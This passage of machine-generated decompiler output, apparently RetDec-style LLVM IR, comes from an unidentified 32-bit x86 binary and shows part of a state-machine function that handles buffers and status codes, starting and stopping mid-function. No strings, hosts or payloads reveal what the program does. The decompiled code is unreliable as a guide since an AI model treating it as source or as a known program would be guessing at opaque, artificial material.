  br i1 %v1_804a5f5, label %dec_label_pc_804b3cf, label %dec_label_pc_804a5fb

dec_label_pc_804a5fb:                             ; preds = %dec_label_pc_804a5cd
  %v0_804a5f0 = load i32, i32* @esp, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a60a = load i32, i32* %v3_804a3af, align 8
  store i32 %v4_804a60a, i32* %eax.global-to-local, align 4
  %v3_804a610 = inttoptr i32 %v0_804a5f0 to i32*
  store i32 %v4_804a60a, i32* %v3_804a610, align 4
  %v0_804a611 = load i32, i32* %stack_var_-188, align 4
  %v1_804a611 = call i32 @function_8049e8b(i32 %v0_804a611)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a63c = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a63c = inttoptr i32 %v3_804a63c to i8*
  store i8 1, i8* %v4_804a63c, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804a646:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v2_804a655 = add i32 %v2_804a02b, %v2_8049f6b
  %v1_804a657 = add i32 %v2_804a655, 12
  store i32 %v1_804a657, i32* %eax.global-to-local, align 4
  %v1_804a65a = inttoptr i32 %v1_804a657 to i32*
  %v2_804a65a = load i32, i32* %v1_804a65a, align 4
  store i32 %v2_804a65a, i32* %eax.global-to-local, align 4
  %v1_804a65c = icmp eq i32 %v2_804a65a, 0
  %v1_804a65e = icmp eq i1 %v1_804a65c, false
  br i1 %v1_804a65e, label %dec_label_pc_804a685, label %dec_label_pc_804a660

dec_label_pc_804a660:                             ; preds = %dec_label_pc_804a646
  store i32 %v1_804a145, i32* @ebx, align 4
  %v0_804a663 = load i32, i32* @esp, align 4
  %v1_804a666 = add i32 %v0_804a663, -16
  %v2_804a666 = inttoptr i32 %v1_804a666 to i32*
  store i32 0, i32* %v2_804a666, align 4
  %v1_804a668 = inttoptr i32 %v6_804a02e to i32*
  %v2_804a668 = call i32 @function_804e134(i32* %v1_804a668)
  store i32 %v2_8049f6b, i32* %edx.global-to-local, align 4
  %v0_804a675 = load i32, i32* @ebx, align 4
  %v2_804a67b = mul i32 %v0_804a675, 24
  %v1_804a680 = add i32 %v2_804a380, %v2_804a67b
  store i32 %v1_804a680, i32* %eax.global-to-local, align 4
  %v2_804a683 = inttoptr i32 %v1_804a680 to i32*
  store i32 %v2_804a668, i32* %v2_804a683, align 4
  br label %dec_label_pc_804a685

dec_label_pc_804a685:                             ; preds = %dec_label_pc_804a646, %dec_label_pc_804a660
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v1_804a696 = add i32 %v2_804a655, 20
  store i32 %v1_804a696, i32* %eax.global-to-local, align 4
  %v1_804a699 = inttoptr i32 %v1_804a696 to i32*
  %v2_804a699 = load i32, i32* %v1_804a699, align 4
  store i32 %v2_804a699, i32* %eax.global-to-local, align 4
  %v1_804a69b = load i32, i32* @esp, align 4
  %v2_804a69b = add i32 %v1_804a69b, -4
  %v3_804a69b = inttoptr i32 %v2_804a69b to i32*
  store i32 %v2_804a699, i32* %v3_804a69b, align 4
  %v0_804a69c = load i32, i32* %stack_var_-188, align 4
  %v1_804a69c = inttoptr i32 %v0_804a69c to i8*
  %v2_804a69c = call i32 @function_8049774(i8* %v1_804a69c)
  store i32 %v2_804a69c, i32* %eax.global-to-local, align 4
  %v0_804a6a1 = load i32, i32* @esp, align 4
  %v1_804a6a1 = add i32 %v0_804a6a1, 4
  %v1_804a6a4 = icmp eq i32 %v2_804a69c, 0
  br i1 %v1_804a6a4, label %dec_label_pc_804a6bc, label %dec_label_pc_804a6a8

dec_label_pc_804a6a8:                             ; preds = %dec_label_pc_804a685
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  store i8 8, i8* %v4_804a02e, align 8
  %v1_804a702.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a6bc

dec_label_pc_804a6bc:                             ; preds = %dec_label_pc_804a685, %dec_label_pc_804a6a8
  %v1_804a702 = phi i32 [ %v1_804a6a1, %dec_label_pc_804a685 ], [ %v1_804a702.pre, %dec_label_pc_804a6a8 ]
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v1_804a6cd = add i32 %v2_804a655, 16
  store i32 %v1_804a6cd, i32* %eax.global-to-local, align 4
  %v1_804a6d0 = inttoptr i32 %v1_804a6cd to i32*
  %v2_804a6d0 = load i32, i32* %v1_804a6d0, align 8
  %v1_804a6d4 = urem i32 %v2_804a6d0, 65536
  store i32 %v1_804a6d4, i32* @esi, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804a696, i32* %eax.global-to-local, align 4
  %v2_804a6ee = load i32, i32* %v1_804a699, align 4
  store i32 %v2_804a6ee, i32* @ebx, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a6ff = inttoptr i32 %v2_804a655 to i32*
  %v4_804a6ff = load i32, i32* %v3_804a6ff, align 8
  store i32 %v4_804a6ff, i32* %eax.global-to-local, align 4
  %v2_804a702 = add i32 %v1_804a702, -4
  %v3_804a702 = inttoptr i32 %v2_804a702 to i32*
  store i32 %v1_804a6d4, i32* %v3_804a702, align 4
  %v1_804a703 = add i32 %v1_804a702, -8
  %v2_804a703 = inttoptr i32 %v1_804a703 to i32*
  store i32 1024, i32* %v2_804a703, align 4
  %v0_804a708 = load i32, i32* @ebx, align 4
  %v2_804a708 = add i32 %v1_804a702, -12
  %v3_804a708 = inttoptr i32 %v2_804a708 to i32*
  store i32 %v0_804a708, i32* %v3_804a708, align 4
  %v1_804a709 = add i32 %v1_804a702, -16
  %v2_804a709 = inttoptr i32 %v1_804a709 to i32*
  store i32 10000, i32* %v2_804a709, align 4
  %v1_804a70e = add i32 %v1_804a702, -20
  %v2_804a70e = inttoptr i32 %v1_804a70e to i32*
  store i32 0, i32* %v2_804a70e, align 4
  %v1_804a710 = add i32 %v1_804a702, -24
  %v2_804a710 = inttoptr i32 %v1_804a710 to i32*
  store i32 0, i32* %v2_804a710, align 4
  %v1_804a712 = add i32 %v1_804a702, -28
  %v2_804a712 = inttoptr i32 %v1_804a712 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_805298f.32 to i32), i32* %v2_804a712, align 4
  %v0_804a717 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a717 = add i32 %v1_804a702, -32
  %v3_804a717 = inttoptr i32 %v2_804a717 to i32*
  store i32 %v0_804a717, i32* %v3_804a717, align 4
  %v0_804a718 = call i32 @function_8049875()
  store i32 %v0_804a718, i32* %eax.global-to-local, align 4
  %v1_804a720 = icmp eq i32 %v0_804a718, 0
  br i1 %v1_804a720, label %dec_label_pc_804a79c, label %dec_label_pc_804a724

dec_label_pc_804a724:                             ; preds = %dec_label_pc_804a6bc
  store i32 0, i32* %v1_804a65a, align 4
  %v1_804a752 = inttoptr i32 %v1_804a6cd to i16*
  store i16 0, i16* %v1_804a752, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804a696, i32* %eax.global-to-local, align 4
  %v2_804a76b = load i32, i32* %v1_804a699, align 4
  store i32 %v2_804a76b, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804a774 = load i32, i32* @esp, align 4
  %v2_804a777 = add i32 %v0_804a774, -8
  %v3_804a777 = inttoptr i32 %v2_804a777 to i32*
  store i32 1024, i32* %v3_804a777, align 4
  %v1_804a778 = add i32 %v0_804a774, -12
  %v2_804a778 = inttoptr i32 %v1_804a778 to i32*
  store i32 0, i32* %v2_804a778, align 4
  %v0_804a77a = load i32, i32* %edx.global-to-local, align 4
  %v2_804a77a = add i32 %v0_804a774, -16
  %v3_804a77a = inttoptr i32 %v2_804a77a to i32*
  store i32 %v0_804a77a, i32* %v3_804a77a, align 4
  %v0_804a77b = load i32, i32* %stack_var_-188, align 4
  %v1_804a77b = load i32, i32* %stack_var_-184, align 4
  %v2_804a77b = load i32, i32* %stack_var_-180, align 4
  %v3_804a77b = inttoptr i32 %v0_804a77b to i8*
  %v4_804a77b = call i32 @function_804f1d8(i8* %v3_804a77b, i32 %v1_804a77b, i32 %v2_804a77b)
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  store i8 3, i8* %v4_804a02e, align 8
  br label %dec_label_pc_804b3cf

dec_label_pc_804a79c:                             ; preds = %dec_label_pc_804a6bc
  store i32 %v1_804a145, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804a696, i32* %eax.global-to-local, align 4
  %v2_804a7b3 = load i32, i32* %v1_804a699, align 4
  %v1_804a7c0 = and i32 %v2_804a7b3, -256
  store i32 %v1_804a7c0, i32* %eax.global-to-local, align 4
  %v4_804a7c3 = inttoptr i32 %v2_804a7b3 to i8*
  store i32 %v2_804a7b3, i32* @edi, align 4
  %v3_804a7c9 = call i32 @_strlen(i8* %v4_804a7c3)
  %v0_804a7d5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a7db = mul i32 %v0_804a7d5, 24
  %v1_804a7e0 = add i32 %v2_804a7de, %v2_804a7db
  %v1_804a7e3 = trunc i32 %v3_804a7c9 to i16
  %v3_804a7e3 = inttoptr i32 %v1_804a7e0 to i16*
  store i16 %v1_804a7e3, i16* %v3_804a7e3, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804a657, i32* %eax.global-to-local, align 4
  %v2_804a7fa = load i32, i32* %v1_804a65a, align 4
  store i32 %v2_804a7fa, i32* %eax.global-to-local, align 4
  %v1_804a7fc = add i32 %v2_804a7fa, 30
  store i32 %v1_804a7fc, i32* @ebx, align 4
  %v0_804a7ff = load i32, i32* @esp, align 4
  %v1_804a802 = add i32 %v0_804a7ff, -16
  %v2_804a802 = inttoptr i32 %v1_804a802 to i32*
  store i32 0, i32* %v2_804a802, align 4
  %v1_804a804 = inttoptr i32 %v2_804a7b3 to i32*
  %v2_804a804 = call i32 @function_804e134(i32* %v1_804a804)
  store i32 %v2_804a804, i32* %eax.global-to-local, align 4
  %v0_804a80c = load i32, i32* @ebx, align 4
  %v7_804a80c = icmp ult i32 %v0_804a80c, %v2_804a804
  %v1_804a80e = icmp eq i1 %v7_804a80c, false
  br i1 %v1_804a80e, label %dec_label_pc_804b3cf, label %dec_label_pc_804a814

dec_label_pc_804a814:                             ; preds = %dec_label_pc_804a79c
  %v0_804a809 = load i32, i32* @esp, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a823 = load i32, i32* %v3_804a6ff, align 8
  store i32 %v4_804a823, i32* %eax.global-to-local, align 4
  %v3_804a829 = inttoptr i32 %v0_804a809 to i32*
  store i32 %v4_804a823, i32* %v3_804a829, align 4
  %v1_804a82a = call i32 @function_8049e8b(i32 %v2_804a7b3)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a855 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a855 = inttoptr i32 %v3_804a855 to i8*
  store i8 1, i8* %v4_804a855, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804a85f:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a86e = add i32 %.pre, %v2_804a02b
  %v4_804a86e = inttoptr i32 %v3_804a86e to i8*
  %v5_804a86e = load i8, i8* %v4_804a86e, align 2
  %v6_804a86e = zext i8 %v5_804a86e to i32
  store i32 %v6_804a86e, i32* %eax.global-to-local, align 4
  %v1_804a877 = mul nuw nsw i32 %v6_804a86e, 4
  %v2_804a877 = add nuw nsw i32 %v1_804a877, 134566216
  %v3_804a877 = inttoptr i32 %v2_804a877 to i32*
  %v4_804a877 = load i32, i32* %v3_804a877, align 4
  %v1_804a889 = and i32 %v4_804a877, -256
  store i32 %v1_804a889, i32* %eax.global-to-local, align 4
  %v4_804a88c = inttoptr i32 %v4_804a877 to i8*
  store i32 %v4_804a877, i32* @edi, align 4
  %v3_804a892 = call i32 @_strlen(i8* %v4_804a88c)
  store i32 %v3_804a892, i32* @esi, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v5_804a8aa = load i8, i8* %v4_804a86e, align 2
  %v6_804a8aa = zext i8 %v5_804a8aa to i32
  store i32 %v6_804a8aa, i32* %eax.global-to-local, align 4
  %v1_804a8b3 = mul nuw nsw i32 %v6_804a8aa, 4
  %v2_804a8b3 = add nuw nsw i32 %v1_804a8b3, 134566216
  %v3_804a8b3 = inttoptr i32 %v2_804a8b3 to i32*
  %v4_804a8b3 = load i32, i32* %v3_804a8b3, align 4
  store i32 %v4_804a8b3, i32* @ebx, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v2_804a8c9 = add i32 %v2_804a02b, %v2_8049f6b
  %v3_804a8c9 = inttoptr i32 %v2_804a8c9 to i32*
  %v4_804a8c9 = load i32, i32* %v3_804a8c9, align 8
  store i32 %v4_804a8c9, i32* %eax.global-to-local, align 4
  %v0_804a8cc = load i32, i32* @esp, align 4
  %v1_804a8cc = add i32 %v0_804a8cc, -4
  %v2_804a8cc = inttoptr i32 %v1_804a8cc to i32*
  store i32 16384, i32* %v2_804a8cc, align 4
  %v0_804a8d1 = load i32, i32* @esi, align 4
  %v2_804a8d1 = add i32 %v0_804a8cc, -8
  %v3_804a8d1 = inttoptr i32 %v2_804a8d1 to i32*
  store i32 %v0_804a8d1, i32* %v3_804a8d1, align 4
  %v0_804a8d2 = load i32, i32* @ebx, align 4
  %v2_804a8d2 = add i32 %v0_804a8cc, -12
  %v3_804a8d2 = inttoptr i32 %v2_804a8d2 to i32*
  store i32 %v0_804a8d2, i32* %v3_804a8d2, align 4
  %v0_804a8d3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a8d3 = add i32 %v0_804a8cc, -16
  %v3_804a8d3 = inttoptr i32 %v2_804a8d3 to i32*
  store i32 %v0_804a8d3, i32* %v3_804a8d3, align 4
  %v4_804a8d4 = call i32 @function_804f64c(i32 %v4_804a877, i32 %stack_var_-224.229, i32 %.v2_8049ee0, i32 %v2_8049f6b)
  %v0_804a8d9 = load i32, i32* @esp, align 4
  %v2_804a8dc = icmp slt i32 %v4_804a8d4, 0
  %v1_804a8de = icmp eq i1 %v2_804a8dc, false
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a93a = load i32, i32* %v3_804a8c9, align 8
  store i32 %v4_804a93a, i32* %eax.global-to-local, align 4
  br i1 %v1_804a8de, label %dec_label_pc_804a92b, label %dec_label_pc_804a8e0

dec_label_pc_804a8e0:                             ; preds = %dec_label_pc_804a85f
  %v3_804a8f5 = inttoptr i32 %v0_804a8d9 to i32*
  store i32 %v4_804a93a, i32* %v3_804a8f5, align 4
  %v1_804a8f6 = call i32 @function_8049e8b(i32 %v4_804a877)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a921 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a921 = inttoptr i32 %v3_804a921 to i8*
  store i8 1, i8* %v4_804a921, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804a92b:                             ; preds = %dec_label_pc_804a85f
  %v1_804a93d = add i32 %v0_804a8d9, 12
  %v2_804a93d = inttoptr i32 %v1_804a93d to i32*
  store i32 16384, i32* %v2_804a93d, align 4
  %v1_804a942 = add i32 %v0_804a8d9, 8
  %v2_804a942 = inttoptr i32 %v1_804a942 to i32*
  store i32 2, i32* %v2_804a942, align 4
  %v1_804a944 = add i32 %v0_804a8d9, 4
  %v2_804a944 = inttoptr i32 %v1_804a944 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052995.33 to i32), i32* %v2_804a944, align 4
  %v0_804a949 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a949 = inttoptr i32 %v0_804a8d9 to i32*
  store i32 %v0_804a949, i32* %v3_804a949, align 4
  %v4_804a94a = call i32 @function_804f64c(i32 %v4_804a877, i32 %stack_var_-224.229, i32 %.v2_8049ee0, i32 %v2_8049f6b)
  %v0_804a94f = load i32, i32* @esp, align 4
  %v2_804a952 = icmp slt i32 %v4_804a94a, 0
  %v1_804a954 = icmp eq i1 %v2_804a952, false
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  br i1 %v1_804a954, label %dec_label_pc_804a9a1, label %dec_label_pc_804a956

dec_label_pc_804a956:                             ; preds = %dec_label_pc_804a92b
  %v4_804a965 = load i32, i32* %v3_804a8c9, align 8
  store i32 %v4_804a965, i32* %eax.global-to-local, align 4
  %v3_804a96b = inttoptr i32 %v0_804a94f to i32*
  store i32 %v4_804a965, i32* %v3_804a96b, align 4
  %v1_804a96c = call i32 @function_8049e8b(i32 %v4_804a877)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a997 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a997 = inttoptr i32 %v3_804a997 to i8*
  store i8 1, i8* %v4_804a997, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804a9a1:                             ; preds = %dec_label_pc_804a92b
  store i8 4, i8* %v4_804a02e, align 8
  br label %dec_label_pc_804b3cf

dec_label_pc_804a9ba:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v2_804a9c9 = add i32 %v2_804a02b, %v2_8049f6b
  %v1_804a9cb = add i32 %v2_804a9c9, 12
  store i32 %v1_804a9cb, i32* %eax.global-to-local, align 4
  %v1_804a9ce = inttoptr i32 %v1_804a9cb to i32*
  %v2_804a9ce = load i32, i32* %v1_804a9ce, align 4
  store i32 %v2_804a9ce, i32* %eax.global-to-local, align 4
  %v1_804a9d0 = icmp eq i32 %v2_804a9ce, 0
  %v1_804a9d2 = icmp eq i1 %v1_804a9d0, false
  br i1 %v1_804a9d2, label %dec_label_pc_804a9f9, label %dec_label_pc_804a9d4

dec_label_pc_804a9d4:                             ; preds = %dec_label_pc_804a9ba
  store i32 %v1_804a145, i32* @ebx, align 4
  %v0_804a9d7 = load i32, i32* @esp, align 4
  %v1_804a9da = add i32 %v0_804a9d7, -16
  %v2_804a9da = inttoptr i32 %v1_804a9da to i32*
  store i32 0, i32* %v2_804a9da, align 4
  %v1_804a9dc = inttoptr i32 %v6_804a02e to i32*
  %v2_804a9dc = call i32 @function_804e134(i32* %v1_804a9dc)
  store i32 %v2_8049f6b, i32* %edx.global-to-local, align 4
  %v0_804a9e9 = load i32, i32* @ebx, align 4
  %v2_804a9ef = mul i32 %v0_804a9e9, 24
  %v1_804a9f4 = add i32 %v2_804a380, %v2_804a9ef
  store i32 %v1_804a9f4, i32* %eax.global-to-local, align 4
  %v2_804a9f7 = inttoptr i32 %v1_804a9f4 to i32*
  store i32 %v2_804a9dc, i32* %v2_804a9f7, align 4
  br label %dec_label_pc_804a9f9

dec_label_pc_804a9f9:                             ; preds = %dec_label_pc_804a9ba, %dec_label_pc_804a9d4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v1_804aa0a = add i32 %v2_804a9c9, 16
  store i32 %v1_804aa0a, i32* %eax.global-to-local, align 4
  %v1_804aa0d = inttoptr i32 %v1_804aa0a to i32*
  %v2_804aa0d = load i32, i32* %v1_804aa0d, align 8
  %v1_804aa11 = urem i32 %v2_804aa0d, 65536
  store i32 %v1_804aa11, i32* @esi, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v1_804aa28 = add i32 %v2_804a9c9, 20
  store i32 %v1_804aa28, i32* %eax.global-to-local, align 4
  %v1_804aa2b = inttoptr i32 %v1_804aa28 to i32*
  %v2_804aa2b = load i32, i32* %v1_804aa2b, align 4
  store i32 %v2_804aa2b, i32* @ebx, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804aa3c = inttoptr i32 %v2_804a9c9 to i32*
  %v4_804aa3c = load i32, i32* %v3_804aa3c, align 8
  store i32 %v4_804aa3c, i32* %eax.global-to-local, align 4
  %v1_804aa3f = load i32, i32* @esp, align 4
  %v2_804aa3f = add i32 %v1_804aa3f, -4
  %v3_804aa3f = inttoptr i32 %v2_804aa3f to i32*
  store i32 %v1_804aa11, i32* %v3_804aa3f, align 4
  %v1_804aa40 = add i32 %v1_804aa3f, -8
  %v2_804aa40 = inttoptr i32 %v1_804aa40 to i32*
  store i32 1024, i32* %v2_804aa40, align 4
  %v0_804aa45 = load i32, i32* @ebx, align 4
  %v2_804aa45 = add i32 %v1_804aa3f, -12
  %v3_804aa45 = inttoptr i32 %v2_804aa45 to i32*
  store i32 %v0_804aa45, i32* %v3_804aa45, align 4
  %v1_804aa46 = add i32 %v1_804aa3f, -16
  %v2_804aa46 = inttoptr i32 %v1_804aa46 to i32*
  store i32 10000, i32* %v2_804aa46, align 4
  %v1_804aa4b = add i32 %v1_804aa3f, -20
  %v2_804aa4b = inttoptr i32 %v1_804aa4b to i32*
  store i32 0, i32* %v2_804aa4b, align 4
  %v1_804aa4d = add i32 %v1_804aa3f, -24
  %v2_804aa4d = inttoptr i32 %v1_804aa4d to i32*
  store i32 1, i32* %v2_804aa4d, align 4
  %v1_804aa4f = add i32 %v1_804aa3f, -28
  %v2_804aa4f = inttoptr i32 %v1_804aa4f to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052998.34 to i32), i32* %v2_804aa4f, align 4
  %v0_804aa54 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa54 = add i32 %v1_804aa3f, -32
  %v3_804aa54 = inttoptr i32 %v2_804aa54 to i32*
  store i32 %v0_804aa54, i32* %v3_804aa54, align 4
  %v0_804aa55 = call i32 @function_8049875()
  %v0_804aa5a = load i32, i32* @esp, align 4
  %v1_804aa5d = icmp eq i32 %v0_804aa55, 0
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a9c9, i32* %eax.global-to-local, align 4
  br i1 %v1_804aa5d, label %dec_label_pc_804ab1e, label %dec_label_pc_804aa65

dec_label_pc_804aa65:                             ; preds = %dec_label_pc_804a9f9
  store i32 0, i32* %v1_804a9ce, align 4
  %v1_804aa93 = inttoptr i32 %v1_804aa0a to i16*
  store i16 0, i16* %v1_804aa93, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804aa28, i32* %eax.global-to-local, align 4
  %v2_804aaac = load i32, i32* %v1_804aa2b, align 4
  store i32 %v2_804aaac, i32* %eax.global-to-local, align 4
  %v0_804aaae = load i32, i32* @esp, align 4
  %v1_804aab1 = add i32 %v0_804aaae, -12
  %v2_804aab1 = inttoptr i32 %v1_804aab1 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052998.34 to i32), i32* %v2_804aab1, align 4
  %v0_804aab6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aab6 = add i32 %v0_804aaae, -16
  %v3_804aab6 = inttoptr i32 %v2_804aab6 to i32*
  store i32 %v0_804aab6, i32* %v3_804aab6, align 4
  %v2_804aab7 = inttoptr i32 %stack_var_-224.229 to i8*
  %v3_804aab7 = call i32 @function_804f284(i32 %stack_var_-228.227, i8* %v2_804aab7)
  %v1_804aabf = icmp eq i32 %v3_804aab7, 0
  %. = select i1 %v1_804aabf, i8 7, i8 5
  store i8 %., i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804aa28, i32* %eax.global-to-local, align 4
  %v2_804ab01 = load i32, i32* %v1_804aa2b, align 4
  store i32 %v2_804ab01, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804ab0a = load i32, i32* @esp, align 4
  %v2_804ab0d = add i32 %v0_804ab0a, -8
  %v3_804ab0d = inttoptr i32 %v2_804ab0d to i32*
  store i32 1024, i32* %v3_804ab0d, align 4
  %v1_804ab0e = add i32 %v0_804ab0a, -12
  %v2_804ab0e = inttoptr i32 %v1_804ab0e to i32*
  store i32 0, i32* %v2_804ab0e, align 4
  %v0_804ab10 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ab10 = add i32 %v0_804ab0a, -16
  %v3_804ab10 = inttoptr i32 %v2_804ab10 to i32*
  store i32 %v0_804ab10, i32* %v3_804ab10, align 4
  %v3_804ab11 = inttoptr i32 %stack_var_-228.227 to i8*
  %v4_804ab11 = call i32 @function_804f1d8(i8* %v3_804ab11, i32 %stack_var_-224.229, i32 %.v2_8049ee0)
  store i32 %v4_804ab11, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3cf

dec_label_pc_804ab1e:                             ; preds = %dec_label_pc_804a9f9
  store i32 %v1_804aa28, i32* %eax.global-to-local, align 4
  %v2_804ab32 = load i32, i32* %v1_804aa2b, align 4
  store i32 %v2_804ab32, i32* %eax.global-to-local, align 4
  %v1_804ab37 = add i32 %v0_804aa5a, 20
  %v2_804ab37 = inttoptr i32 %v1_804ab37 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_80529a1.35 to i32), i32* %v2_804ab37, align 4
  %v0_804ab3c = load i32, i32* %eax.global-to-local, align 4
  %v2_804ab3c = add i32 %v0_804aa5a, 16
  %v3_804ab3c = inttoptr i32 %v2_804ab3c to i32*
  store i32 %v0_804ab3c, i32* %v3_804ab3c, align 4
  %v2_804ab3d = inttoptr i32 %stack_var_-224.229 to i8*
  %v3_804ab3d = call i32 @function_804f284(i32 %stack_var_-228.227, i8* %v2_804ab3d)
  store i32 %v3_804ab3d, i32* %eax.global-to-local, align 4
  %v1_804ab45 = icmp eq i32 %v3_804ab3d, 0
  br i1 %v1_804ab45, label %dec_label_pc_804ab94, label %dec_label_pc_804ab49

dec_label_pc_804ab49:                             ; preds = %dec_label_pc_804ab1e
  %v0_804ab42 = load i32, i32* @esp, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804ab58 = load i32, i32* %v3_804aa3c, align 8
  store i32 %v4_804ab58, i32* %eax.global-to-local, align 4
  %v3_804ab5e = inttoptr i32 %v0_804ab42 to i32*
  store i32 %v4_804ab58, i32* %v3_804ab5e, align 4
  %v1_804ab5f = call i32 @function_8049e8b(i32 %stack_var_-228.227)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804ab8a = add i32 %v2_8049faf, %v2_804a02b
  %v4_804ab8a = inttoptr i32 %v3_804ab8a to i8*
  store i8 0, i8* %v4_804ab8a, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804ab94:                             ; preds = %dec_label_pc_804ab1e
  store i32 %v1_804a145, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804aa28, i32* %eax.global-to-local, align 4
  %v2_804abab = load i32, i32* %v1_804aa2b, align 4
  %v1_804abb8 = and i32 %v2_804abab, -256
  store i32 %v1_804abb8, i32* %eax.global-to-local, align 4
  %v4_804abbb = inttoptr i32 %v2_804abab to i8*
  store i32 %v2_804abab, i32* @edi, align 4
  %v3_804abc1 = call i32 @_strlen(i8* %v4_804abbb)
  %v0_804abcd = load i32, i32* %ebx.global-to-local, align 4
  %v2_804abd3 = mul i32 %v0_804abcd, 24
  %v1_804abd8 = add i32 %v2_804a7de, %v2_804abd3
  %v1_804abdb = trunc i32 %v3_804abc1 to i16
  %v3_804abdb = inttoptr i32 %v1_804abd8 to i16*
  store i16 %v1_804abdb, i16* %v3_804abdb, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804a9cb, i32* %eax.global-to-local, align 4
  %v2_804abf2 = load i32, i32* %v1_804a9ce, align 4
  store i32 %v2_804abf2, i32* %eax.global-to-local, align 4
  %v1_804abf4 = add i32 %v2_804abf2, 30
  store i32 %v1_804abf4, i32* @ebx, align 4
  %v0_804abf7 = load i32, i32* @esp, align 4
  %v1_804abfa = add i32 %v0_804abf7, -16
  %v2_804abfa = inttoptr i32 %v1_804abfa to i32*
  store i32 0, i32* %v2_804abfa, align 4
  %v1_804abfc = inttoptr i32 %v2_804abab to i32*
  %v2_804abfc = call i32 @function_804e134(i32* %v1_804abfc)
  store i32 %v2_804abfc, i32* %eax.global-to-local, align 4
  %v0_804ac04 = load i32, i32* @ebx, align 4
  %v7_804ac04 = icmp ult i32 %v0_804ac04, %v2_804abfc
  %v1_804ac06 = icmp eq i1 %v7_804ac04, false
  br i1 %v1_804ac06, label %dec_label_pc_804b3cf, label %dec_label_pc_804ac0c

dec_label_pc_804ac0c:                             ; preds = %dec_label_pc_804ab94
